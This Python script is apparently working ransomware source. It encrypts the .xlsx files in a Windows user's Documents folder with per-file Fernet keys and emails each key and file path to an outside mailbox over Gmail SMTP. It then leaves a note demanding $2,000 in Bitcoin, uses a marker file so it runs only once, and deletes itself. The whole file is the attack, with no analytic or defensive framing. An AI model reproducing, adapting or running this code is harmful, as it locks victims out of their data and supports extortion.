import os
from cryptography.fernet import Fernet
import smtplib
from os import remove
from sys import argv

# Get The Documents Path
path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')

# Path For the chkfile
chkfile = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData/Roaming/Microsoft/Windows')

# Check IF chkfile.txt Exist IF True Exit ELSE Decrypt
# To Avoid Encrypting the Files Again
path_name = os.path.join(chkfile, "chkfile.txt")
if os.path.exists(path_name):
    exit()
else:
    # Generate Check FILE
    chkf = open(os.path.join(chkfile, "chkfile.txt"), mode="w")
    chkf.close()

    # Get All Files in The Previous Path That Ends With .xlsx
    for root, directories, filex in os.walk(path):
        for fil in filex:
            if fil.endswith(".xlsx"):
                x = (os.path.join(root, fil))

                # Generate a Random Encryption Key
                key = Fernet.generate_key()

                # Create a Fernet Object Using the Generated key
                fernet = Fernet(key)

                # Decode Methode to Remove the [b']
                dkey = key.decode()

                # Read the File to Encrypt
                with open(x, 'rb') as f:
                    file = f.read()

                # Calling the Encrypt Function to encrypt the file
                encrypt_file = fernet.encrypt(file)

                # Open File and Write the Encryption Data
                with open(x, 'wb') as encrypted_file:
                    encrypted_file.write(encrypt_file)

                # Send File Path and Key via Email
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                server.login("email@gmail.com", "password")
                message = 'Subject: {}\n\n{}'.format(x, dkey)
                server.sendmail(
                    "email@gmail.com",
                    "email@domain.com",
                    message)
                server.quit()

    # Create TXT File With Wallet Address
    f = open(os.path.join(path, "GetYourFilesBackHere!!.txt"), mode="w")
    f.write("To Get Your Files Back, Please Send $2,000 in Bitcoin to this Wallet:\n"
            "Address: 042E6888036C886AB0248474B69DC695BC54E0C8AEC33E5AB735F182F1B\n"
            "Email US: email@gmail.com")
    f.close()

# Delete The Script After Running
remove(argv[0])
